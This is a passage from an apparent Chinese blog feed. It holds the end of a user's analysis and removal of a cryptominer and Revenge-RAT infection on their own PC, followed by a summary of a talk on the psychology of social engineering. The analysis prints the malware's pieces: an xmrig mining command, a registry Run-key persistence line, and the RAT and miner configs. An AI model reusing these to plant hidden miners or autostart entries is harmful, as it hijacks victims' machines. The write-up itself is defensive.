45U77PaDJanVNk3ePum21GTB3BbA89ppF6Jo8UMpadCp9gnm9W9amSE4LNCk4tsiS1PNALDMUjvPF8PPVtkgikggJZeuChz -p x -k -B</span><br><span class="line">Pause</span><br></pre></td></tr></table></figure><p>emmmm，虽然，好像，看不懂这个代码的具体意思，但是根据我的一些经验来看，应该是xmrig这个程序输出 xmr.crypto-pool.fr这个文件，在网上看到这就是个挖矿的病毒程序，并且采用了一些加密的方式，后面密文估计就是加密的啥玩意（我也不懂，手动滑稽）</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122092312.png" class="lozad"></p><p>再看看start.cmd</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093214.png" class="lozad"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">xmrig.exe</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>看看run.bat中的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v BGClient /t REG_SZ /d C:\System32\TTy_start.bat /F</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>从这个代码来看，是将C:\System32\TTy_start.bat添加到注册表了，到这个对应的注册表看看吧。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093606.png" class="lozad"></p><p>果然在注册表中找到了这个批处理文件，并且从注册表中的意思就可以看出来意思是每次开机都会启动这个C:\System32\Tty_start.bat这个批处理文件。</p><p>分析完注册表，我们再到system32这个文件夹 ，看到文件夹中还有两个config的文件，就打开看了一下</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093736.png" class="lozad"></p><p>打开config.xml代码如下，有个2222端口，2222端口是我今天使用配置的端口，我猜测这应该是我今天使用产生的配置文件了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Rev&gt;</span><br><span class="line">&lt;Socket_Key&gt;</span><br><span class="line">&lt;![CDATA[Revenge-RAT]]&gt;</span><br><span class="line">&lt;/Socket_Key&gt;</span><br><span class="line">&lt;Connections_Port&gt;</span><br><span class="line">&lt;![CDATA[2222]]&gt;</span><br><span class="line">&lt;/Connections_Port&gt;</span><br><span class="line">&lt;Minimizing&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Minimizing&gt;</span><br><span class="line">&lt;Listening&gt;</span><br><span class="line">&lt;![CDATA[False]]&gt;</span><br><span class="line">&lt;/Listening&gt;</span><br><span class="line">&lt;Ping&gt;</span><br><span class="line">&lt;![CDATA[15]]&gt;</span><br><span class="line">&lt;/Ping&gt;</span><br><span class="line">&lt;Visual&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Visual&gt;</span><br><span class="line">&lt;Notification&gt;</span><br><span class="line">&lt;![CDATA[False]]&gt;</span><br><span class="line">&lt;/Notification&gt;</span><br><span class="line">&lt;Sound&gt;</span><br><span class="line">&lt;![CDATA[False]]&gt;</span><br><span class="line">&lt;/Sound&gt;</span><br><span class="line">&lt;Desktop&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Desktop&gt;</span><br><span class="line">&lt;DesktopValue&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/DesktopValue&gt;</span><br><span class="line">&lt;Webcam&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Webcam&gt;</span><br><span class="line">&lt;WebcamValue&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/WebcamValue&gt;</span><br><span class="line">&lt;ThumbnailsValue&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/ThumbnailsValue&gt;</span><br><span class="line">&lt;Flags&gt;</span><br><span class="line">&lt;![CDATA[1]]&gt;</span><br><span class="line">&lt;/Flags&gt;</span><br><span class="line">&lt;Gridlines&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/Gridlines&gt;</span><br><span class="line">&lt;View&gt;</span><br><span class="line">&lt;![CDATA[2]]&gt;</span><br><span class="line">&lt;/View&gt;</span><br><span class="line">&lt;Theme&gt;</span><br><span class="line">&lt;![CDATA[0]]&gt;</span><br><span class="line">&lt;/Theme&gt;</span><br><span class="line">&lt;ACR&gt;</span><br><span class="line">&lt;![CDATA[True]]&gt;</span><br><span class="line">&lt;/ACR&gt;</span><br><span class="line">&lt;/Rev&gt;</span><br></pre></td></tr></table></figure><p>在打开config.json看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;algo&quot;: &quot;cryptonight&quot;,</span><br><span class="line">    &quot;api&quot;: &#123;</span><br><span class="line">        &quot;port&quot;: 0,</span><br><span class="line">        &quot;access-token&quot;: null,</span><br><span class="line">        &quot;id&quot;: null,</span><br><span class="line">        &quot;worker-id&quot;: null,</span><br><span class="line">        &quot;ipv6&quot;: false,</span><br><span class="line">        &quot;restricted&quot;: true</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;asm&quot;: true,</span><br><span class="line">    &quot;autosave&quot;: true,</span><br><span class="line">    &quot;av&quot;: 0,</span><br><span class="line">    &quot;background&quot;: false,</span><br><span class="line">    &quot;colors&quot;: true,</span><br><span class="line">    &quot;cpu-affinity&quot;: null,</span><br><span class="line">    &quot;cpu-priority&quot;: null,</span><br><span class="line">    &quot;donate-level&quot;: 5,</span><br><span class="line">    &quot;huge-pages&quot;: true,</span><br><span class="line">    &quot;hw-aes&quot;: null,</span><br><span class="line">    &quot;log-file&quot;: null,</span><br><span class="line">    &quot;max-cpu-usage&quot;: 100,</span><br><span class="line">    &quot;pools&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;url&quot;: &quot;donate.v2.xmrig.com:3333&quot;,</span><br><span class="line">            &quot;user&quot;: &quot;YOUR_WALLET_ADDRESS&quot;,</span><br><span class="line">            &quot;pass&quot;: &quot;x&quot;,</span><br><span class="line">            &quot;rig-id&quot;: null,</span><br><span class="line">            &quot;nicehash&quot;: false,</span><br><span class="line">            &quot;keepalive&quot;: false,</span><br><span class="line">            &quot;variant&quot;: -1,</span><br><span class="line">            &quot;tls&quot;: false,</span><br><span class="line">            &quot;tls-fingerprint&quot;: null</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;print-time&quot;: 60,</span><br><span class="line">    &quot;retries&quot;: 5,</span><br><span class="line">    &quot;retry-pause&quot;: 5,</span><br><span class="line">    &quot;safe&quot;: false,</span><br><span class="line">    &quot;threads&quot;: null,</span><br><span class="line">    &quot;user-agent&quot;: null,</span><br><span class="line">    &quot;watch&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>里面有个pools</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093834.png" class="lozad"></p><p>WC，这TM不会是别人的远程连接马吧，现在还连接着我的电脑？？？</p><p>ping了一下，还真能ping通。WCNM。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093852.png" class="lozad"></p><p><img alt="img" data-src="https://i04piccdn.sogoucdn.com/98d3e7149f4dcaa6" class="lozad"></p><h1 id="0x02-消毒"><a href="#0x02-消毒" class="headerlink" title="0x02 消毒"></a>0x02 消毒</h1><p>听说有人要消毒？我带了瓶84，不知道够不够用。</p><p><img alt="img" data-src="https://i03piccdn.sogoucdn.com/f0b07d459c73cb3c" class="lozad"></p><p>首先删除我们刚刚在注册表中的BGClient这一项。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122093920.png" class="lozad"></p><p>然后到C盘将system32这个目录直接删掉</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122094001.png" class="lozad"></p><p>本来以为这样就完事了，又去Windows下的system32看了一下，我看到system32的最后修改时间是11月21日，我靠不就是今天吗，不会这里面也被写了什么东西了吧，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122094109.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191122094138.png" class="lozad"></p><p>进去按照时间排序来看果然有几个文件，看着就很像病毒或者被病毒捆绑的玩意。奈何自己太菜，还不能分析这些东西，算了，干脆一不做二不休，直接删了得了。（我真聪明，手动大笑）</p><p>最后，清空回收站，重启~~</p><p><img alt="img" data-src="https://i01piccdn.sogoucdn.com/1f11ba1aee6f4ec4" class="lozad"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>研究技术会有可能被反噬的，大家要注意安全。不安全的软件先扔到虚拟机里面搞搞，没有问题在拿到本机来用，万一虚拟机炸了，还可以快照一键还原啊。</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/88ef46f391bf4d14" class="lozad"></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 病毒分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 病毒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客心理学--社会工程学原理</title>
      <link href="/2019/11/13/%E9%BB%91%E5%AE%A2%E5%BF%83%E7%90%86%E5%AD%A6/"/>
      <url>/2019/11/13/%E9%BB%91%E5%AE%A2%E5%BF%83%E7%90%86%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>该文章整理自第七届互联网安全大会，杨义先教授的PPT内容。杨义先-北京邮电大学信息安全中心主任。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191113145011.png" class="lozad"></p><h1 id="0x01-大会前奏"><a href="#0x01-大会前奏" class="headerlink" title="0x01 大会前奏"></a>0x01 大会前奏</h1><p>大会刚开始，杨教授推荐了几本书</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191113145347.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191113145414.png" class="lozad"></p><p>补天系列丛书”的体系<br>《安全简史》 ：风趣幽默的安全科普；增强全民对抗黑客攻击，整体全面提<br>高网络安全强度。外行不觉深，内行不觉浅<br>《博弈系统论》（待出版） ：黑客行为预测与管理<br>《安全通论》： 在理工科范围内（不含心理学、社会学、经济学、管理学<br>等），几乎没有任何限制（如设备、环境和人员等）的前提下，揭示黑客攻防<br>和安全演化的基本规律。这些规律可以适用于网络空间安全的各主要分支<br>《黑客心理学》： 1）填补全球信息安全界的一个重大空白，努力实现人、<br>网、环境“闭环系统”全方位安全。2）提高全民的防骗、防黑客意识和水平。</p><blockquote><p>《黑客心理学》小结<br>攻城为下，攻心为上；<br>攻网为下，攻人为上。<br>如何攻城，假假真真；<br>如何攻人，社会工程。</p></blockquote><p>因此，本书的副标题叫“社会工程学原理”，即，从原理层次，穷尽所有可能的社工手段。</p><h1 id="0x02-大会正文"><a href="#0x02-大会正文" class="headerlink" title="0x02 大会正文"></a>0x02 大会正文</h1><h2 id="2-1《黑客心理学》的背景"><a href="#2-1《黑客心理学》的背景" class="headerlink" title="2.1《黑客心理学》的背景"></a>2.1《黑客心理学》的背景</h2><ol><li>所有信息安全问题，全都归罪于人！具体地说，归罪于三类人：破坏者（黑客）、保卫者（红客）和使用者（用户）。</li><li>但全球信息安全界，几乎都聚焦于网络或环境安全，而忽略了一个最关键的事实：黑客是人</li><li>反而是黑客们，常常基于心理学成果，利用“社会工程学”（简<br>称“社工”），来攻击“人”；并以此为突破口，结合各种技术<br>和非技术手段，把用户和红客打得落花流水</li><li>“人”只不过是木偶，而人的“心理”才是拉动木偶的那根线；<br>或者说，“人”只不过是“魄”，而“心理”才是“魂</li><li>所以，网络空间安全的根本核心，其实隐藏在人的心里。因此，《黑客心理学》希望借助心理学、社会学，来揭示信息安全的人心奥秘！</li><li>《黑客心理学》希望穷尽所有社工攻击的基本“元素”，即，所<br>有无数种社工攻击方法，都只是这些有限个“元素”的某种融合<br>而已。就像门捷列夫元素周期表中有限（数百）种元素，就能组成宇宙中无数种物质一样；实际上，社工攻击“元素”也只有数百种，被黑客常用的就更少了。</li><li>在人、网、环境的闭环系统中，后两者“没天敌”，只需不断<br>“水涨船高”就行；但是，人是有天敌的，人性的弱点有许多共<br>同处，很难“打补丁”</li><li>总之，赢人者，赢天下；胜人者，胜世界！</li><li>由于“三种人”的目标、地位和能力等各不相同，所以，在网络<br>空间安全攻防过程中，他们的心理因素也会不同。《黑客心理学》将重点探索最具网络特色的黑客心理，因为，若无黑客，几乎就没有安全问题。但遗憾的是，黑客过去存在，现在存在，今后也将永远存在；甚至还可能越来越多</li></ol><h2 id="2-2-黑客的动机、着眼点、机会"><a href="#2-2-黑客的动机、着眼点、机会" class="headerlink" title="2.2 黑客的动机、着眼点、机会"></a>2.2 黑客的动机、着眼点、机会</h2><ol><li><p>从心理学角度看，黑客行为的动机，主要基于如下几种心理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自我表现心理、好奇探秘心理、义愤抗议心理、戏谑心理、非法占有心理、渴望认同心理、自我解嘲心理、发泄心理等</span><br></pre></td></tr></table></figure></li><li><p>反过来，黑客发动攻击时，又利用了被害者的哪些心理呢？归纳起来，至少有如下几种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">恐惧心理、服从心理、贪婪心理、同情心理</span><br></pre></td></tr></table></figure></li><li><p>引发红客和用户不安全的心理因素，主要有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">省能心理、侥幸心理、逆反心理、凑兴心理、群体心理、注意与不注意</span><br></pre></td></tr></table></figure></li></ol><h2 id="2-3-与安全密切相关的心理因素"><a href="#2-3-与安全密切相关的心理因素" class="headerlink" title="2.3 与安全密切相关的心理因素"></a>2.3 与安全密切相关的心理因素</h2><ol><li><p>性格与安全：下面8种性格，不利于安全：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">攻击型性格。</span><br><span class="line">性情孤僻、固执、心胸狭窄。</span><br><span class="line">性情不稳定，易受情绪感染支配，易于冲动，情绪伏波动很大，受情绪影响长时间不易平静</span><br><span class="line">心境抑郁，浮躁不安者</span><br><span class="line">马虎、敷衍、粗心</span><br><span class="line">危急关头，惊慌失措、优柔寡断、鲁莽行事</span><br><span class="line">感知、思维、运动迟钝、不爱活动、懒惰者</span><br><span class="line">懦弱、胆怯、没主见者。</span><br></pre></td></tr></table></figure></li><li><p>能力与安全：<br>只有当能力与任务难度匹配时，才不容易出现安全问题。思维能力强的人，在面对重复的、一成不变的、不需动脑筋的简单操作时，就会感到单调乏味；从而埋下安全隐患。反之，能力较低的人，在面对力所不及的任务时，就会感受到无法胜任，甚至会过度紧张；从而，也容易引发安全问题。</p></li><li><p>情绪、情感与安全：<br>积极情绪，可加深安全重要性认识，具有“增力作用”，能激发安全动机，采取积极态度。而消极情绪，会使人带着厌恶的情感去看待安全，具有“减力作用”，采取消极的态度，从而容易引发不安全行为。</p></li><li><p>意志与安全：<br>意志对安全行为，起着重要的调节作用，主要是：合理控制情绪，克服不利于安全的心理障碍，并调动有利于安全的心理因素，坚持不懈地实现安全目标。</p></li><li><p>感知觉与安全：<br>安全预防的水平，首先取决于对风险的认识水平；对风险认识越深刻，出现问题的可能性就越小</p></li><li><p>个性心理与安全：<br>不良的个性心理特征，常是引发安全问题的直接原因。比如，有的认真负责，有的马虎敷衍；有的谨慎细心，有的粗心大意。对待前人的安全经验，有的不予盲从，事实求是；有的不敢抵制，违心屈从等</p></li><li><p>气质与安全：<br>有些工作，比如，个性化较强的OA类开发，需要反应迅速、动作敏捷、<br>活泼好动、善于交际的人去承担。有些工作，比如，软件漏洞检测等，<br>则需要仔细的、情绪比较稳定的、安静的人去做。等</p></li><li><p>个性对不安全行为的影响，主要表现在两方面：<br>1），态度的影响。<br>2），动机的影响。</p></li><li><p>行为退化对安全的影响：<br>比如：若劳动时间太长，就会产生疲劳；若生活节律被干扰，就不能有<br>效发挥体能；若失去完成任务的动力，就会懒散懈怠；若缺乏鼓励，就<br>会泄气；若突然面对危险，就会产生应激反应等</p></li><li><p>失误与安全的关系及影响：<br>第1，失误是不可避免的副产物，失误率可以测定。<br>第2，工作环境可以诱发失误；故可通过改善工作环境，来防<br>止失误。<br>第3，下级的失误，也许能反映上级的职责缺陷。<br>第4，人的行为，反映其上级的态度；比如仅凭直觉去解决安<br>全问题，或仅靠侥幸来维护安全，那迟早会出问题。<br>第5，过时的惯例，可能促发失误。<br>第6，不安全行为，是操作员促发的、直接导致危害的失误，<br>属于失误的特例。级别越高的人，其失误的后果就越严重。</p></li></ol><h2 id="2-4-黑客攻击行为的分类"><a href="#2-4-黑客攻击行为的分类" class="headerlink" title="2.4 黑客攻击行为的分类"></a>2.4 黑客攻击行为的分类</h2><ol><li>网络黑客攻击是指，违背他人意愿，采取信息手段等非身体接触方式，以伤害他人（的财产或心灵）为目标的行为。</li><li>无论攻击行为是发生在网上或网下，黑客行为的最终效果都主要体现在网络空间中</li><li>按攻击目的划分，黑客行为可大致归为四类：<ol><li>观点表达型</li><li>情绪宣泄型</li><li>利益诉求型</li><li>网络犯罪型</li></ol></li></ol><h2 id="2-5-黑客攻击行为的本能说"><a href="#2-5-黑客攻击行为的本能说" class="headerlink" title="2.5 黑客攻击行为的本能说"></a>2.5 黑客攻击行为的本能说</h2><ol><li>本能说认为：攻击行为是由基因设定的，与遗传相关，它是人类为确保自身安全而形成的一种本能；这种本能经长期进化而来，攻击性强的个体，往往更具生存优势，</li><li>因此，按照本能说<ol><li>黑客攻击是不可避免的</li><li>对攻击行为可定期加以发泄；以无破坏性发泄方式，代替破坏性发泄方式。</li></ol></li></ol><h2 id="2-6-黑客攻击行为的非本能说"><a href="#2-6-黑客攻击行为的非本能说" class="headerlink" title="2.6 黑客攻击行为的非本能说"></a>2.6 黑客攻击行为的非本能说</h2><ol><li><p>非本能说之“挫折理论”认为：</p><ol><li>攻击来源于挫折</li></ol></li><li><p>挫折理论对网络安全的启发至少有：</p><ol><li>无论如何，都不要在网络中激发不必要的矛盾，更不要使任何人遭受不必要的挫折，这样便可大幅度地减少黑客的攻击行为。</li><li>看来，构建和谐的网络社会，对信息安全也是很有利的嘛。</li></ol></li><li><p>非本能说之“社会学习理论”认为：</p><ol><li>人并不是生来就具有攻击能力的，这种能力必须通过学习才能获得。这种学习，是通过观察榜样的行为及其后果来实现的，故又称为观察学习。</li><li>观察了他人的攻击行为及其后果后，人便会形成攻击的观念，并以此指导自己的攻击行为。</li><li>所以，黑客的攻击行为，具有一定的传染性。</li></ol></li></ol><h2 id="2-7-黑客攻击意愿的弱化"><a href="#2-7-黑客攻击意愿的弱化" class="headerlink" title="2.7 黑客攻击意愿的弱化"></a>2.7 黑客攻击意愿的弱化</h2><ol><li>无害宣泄；<br>习得的抑制，即，指人们在社会生活中所学到的，对攻击行为的控制；主要指<ol><li>社会规范的抑制</li><li>痛苦线索的抑制（想象被害者的惨状）</li><li>对报复的畏惧等三点。</li></ol></li><li>置换与替罪羊：当某人遭受挫折，但他又对施害者无可奈何时，就会通过别的方式满足自己的需求；<ol><li>方式之一，便是置换对象，攻击那些与施害者相似的对象</li></ol></li></ol><h2 id="2-8-社工黑客攻击的特点"><a href="#2-8-社工黑客攻击的特点" class="headerlink" title="2.8 社工黑客攻击的特点"></a>2.8 社工黑客攻击的特点</h2><ol><li><p>攻击的直接对象是热血的“人” ，而不是冷血的“设备”，虽然<br>可以运用各种设备来当武器。</p></li><li><p>是一种赛博式攻击，即，常常是需要与被攻击者之间进行多次信息互动，逐步诱导</p></li><li><p>黑客与被攻击的“人”之间，并无直接的身体接触；所以，社工<br>攻击的武器其实只是“信息”，攻击成果的表现形式也是“信息”</p></li><li><p>社工攻击，正在成为黑客攻击的必备手段；甚至，在所有重大黑客事件中，社工攻击几乎都是先锋队的主力军。</p></li><li><p>社工攻击的另一突出特点是：若你不了解它，那它将威力无穷；若你知道它正在攻击你，那你一定会逢凶化吉。比如，当你知道正在接听的某个电话，是诈骗电话时；就算骗子再高明，你也不会上当，甚至还可以随心所欲地戏弄他一番。</p></li><li><p>综合社工攻击的上述特点，请问：</p><ol><li>还有必要假装高雅，而对“社工攻击”不屑一顾吗？<br>还能假装强大，而视“社工攻击”为无物吗？</li></ol></li><li><p>若仅停留在外观，那“社工攻击”手段无穷无尽。就像站在分子<br>层次，人类将永远无法知道“到底有多少种物质”一样；但若深<br>入到人性的底层本质，便可穷尽组成所有无数种社工攻击的少数几个“元素”</p></li></ol><h2 id="2-9-社工黑客如何看待个体"><a href="#2-9-社工黑客如何看待个体" class="headerlink" title="2.9 社工黑客如何看待个体"></a>2.9 社工黑客如何看待个体</h2><ol><li><p>回顾历史的有趣循环：当年，在心理学重大成果（发现了“反馈<br>+微调+迭代”赛博链）的启发下，人类造“电脑”，当时的模<br>特儿是“人脑”；然后，又造了电脑网络；</p></li><li><p>如今，社工黑客在攻击“人脑”时，又是采用“反馈+微调+迭<br>代”的赛博攻击链，又是拿“电脑”当模特儿</p></li><li><p>社工将人看“电脑”，由四部分组成：<br>1）输入：包括外部输入（即，感觉等）、内部反馈输入（即，<br>知觉、动机、情绪和情感等）、噪音输入（即，无意识等）；<br>2）输出：信息输出（即，语言等）、行为输出、内部反馈输<br>出（即，动机、知觉、情绪和情感等）、噪音输出（即，无<br>意识等）<br>3）存储：包括记忆、习惯、无意识等；<br>4）处理：包括计算（即，思维、认知）、去噪（即，注意<br>等）、优化（即，学习、发展）</p></li></ol><h2 id="2-10-社工黑客攻击人的思路"><a href="#2-10-社工黑客攻击人的思路" class="headerlink" title="2.10 社工黑客攻击人的思路"></a>2.10 社工黑客攻击人的思路</h2><ol><li>欲攻破人这个“热血电脑”，就必须使其信息失控；</li><li>欲使信息失控，只需攻破输入、输出、存储或处理四大部分中的任何一部分；</li><li>欲攻破任何一部分，就必须充分利用心理学家已揭示的人性弱点；</li><li>欲充分利用这些弱点，就必须：<ol><li>要么使攻击对象在赛博式反馈循环中被诱入歧途，</li><li>要么截获并利用无意识的噪音输出等。</li><li>至于如何达到这些目标，将是《黑客心理学》的任务，欢迎大家详细阅读。</li></ol></li></ol><h2 id="2-11-社工黑客攻击群体的思路"><a href="#2-11-社工黑客攻击群体的思路" class="headerlink" title="2.11 社工黑客攻击群体的思路"></a>2.11 社工黑客攻击群体的思路</h2><ol><li><p>社工黑客只需要从信息的角度去观察“群体”，而没必要像心理<br>学家那样去全面考虑“群体”。</p></li><li><p>如果组成某群体的个体之间，完全隔离，即，群体成员彼此没有任何信息的交往；那么，黑客便可把这种群体，看成一些独立的“热血电脑”的堆集。既可以独立地，分别攻破这些“热血电<br>脑”；又可以找出他们的共同特点，然后“一箭多雕”。</p></li><li><p>其实，绝大部分群体都应该是这样的：群体成员彼此之间，存在着或多或少的信息交流；因此，在社工黑客看来，群体只不过是由“热血电脑”组成的网络而已；</p></li><li><p>总之，在社工黑客眼里，群体的信息交流架构，完全等同于众所周知的、由冷血电脑搭建的互联网的信息交流架构；因此，黑客可借用已经相当熟悉的、攻击冷血网络的思路，来攻击群体这个“热血网络”</p></li><li><p>若非要在群体这个“热血网络”和“冷血网络”中找出什么差别<br>的话；那针对群体这个“热血网络”的活性（即，它会不断演化、生长），社工黑客还有如下更多的、有利的攻击机会：</p></li></ol><h2 id="2-12-社工黑客攻击群体的便利"><a href="#2-12-社工黑客攻击群体的便利" class="headerlink" title="2.12 社工黑客攻击群体的便利"></a>2.12 社工黑客攻击群体的便利</h2><ol><li><p>合群机会<br>1）合群倾向，有助于社工黑客“打入敌人内部”，从而有利<br>于后续攻击；<br>2）充分合群后，群体成员之间会越来越趋同，从而有利于提<br>高攻击效率，甚至：攻破一个成员后，与其相似的成员也将<br>全被攻破；<br>3）充分合群后，群体中信息交流将更密切；</p><pre><code>故篡改、破坏或截获相关信息将更易；通过一台“热血电脑”做跳板，去远程攻击另一台“热血脑”也更易；黑客隐身也更简单</code></pre></li><li><p>遵从和依从的机会<br>人类普遍存在遵从和服从现象，特别是当来自群体的压力很<br>大，比如，群体中每个人都做出同样的反应时，个人就会有<br>强烈的动机去赞同群体其他成员的意见。</p></li><li><p>充分利用该机会，黑客便能对“热血网络”发动非常有效的攻击，</p><p>比如：将被攻击目标（个体或者小群体）纳入事先伪造好的<br>某个大群体，然后通过操控这个“假冒群体”，来达到操控受害者的目的</p></li><li><p>“热血网络”的单核心信息传输模式</p><ol><li>无论在什么环境下，几乎所有群体，都有一个共同特征，即，群体中总有某些人（意见领袖）说得很多，而其他人则说得很少。</li><li>“热血网络”的信息传输拓扑结构，远比真实互联网这些冷血网络的拓扑结构还要简单明晰；因为它只有一个信息交流的主节点，而其它节点的信息交流量都很少。</li><li>这种单核心结构，对社工黑客显然是有利的。</li></ol></li><li><p>“热血网络”的双核心信息交流结构</p><ol><li>有时群体中会出现两个核心：其一，是意见领袖，他说话最多；其二，是领导，他说话最管用。他们都是社工黑客的重点关注对象。</li><li>通过说话量，社工黑客可准确判断群体的意见领袖；这相当于找到冷血网络中的骨干路由器节点，从而有利于准确找到其攻击目标，因为现实中经常是“领导的话普遍偏多”，而且，即使信息交流受到限制，交流受限最少的人，往往也是领导。</li></ol></li></ol><h2 id="2-13-社工黑客的漏洞思维"><a href="#2-13-社工黑客的漏洞思维" class="headerlink" title="2.13 社工黑客的漏洞思维"></a>2.13 社工黑客的漏洞思维</h2><ol><li>在冷血网络的信息安全对抗中，黑客和红客的主要战场，可能要算“漏洞挖掘”了</li><li>既然社工黑客将人类个体看成“热血电脑”，将人类群体看成<br>“热血网络”；所以，挖掘相应的人性漏洞，也是红黑双方信息<br>安全对抗的核心战场</li><li>与冷血网络不同的是，许多热血漏洞，根本无法“打补丁”，因<br>为，某些漏洞干脆就是人的本能或潜意识习惯</li><li>从漏洞角度看，社工黑客比纯技术黑客处于更有利的地位；换句话说，我们更应该重视如何对抗社工黑客。</li><li>幸好，社工黑客的攻击，几乎都是循环反馈的“赛博式”攻击，<br>所以，只要在其攻击过程中的任何一个环节，挡住了黑客，就算</li><li>红客成功<ol><li>人性漏洞非常多：</li><li>有输入漏洞</li><li>输出漏洞</li><li>处理漏洞</li><li>存储漏洞等四大类漏洞</li></ol></li></ol><h2 id="2-14-社工黑客的战术清单"><a href="#2-14-社工黑客的战术清单" class="headerlink" title="2.14 社工黑客的战术清单"></a>2.14 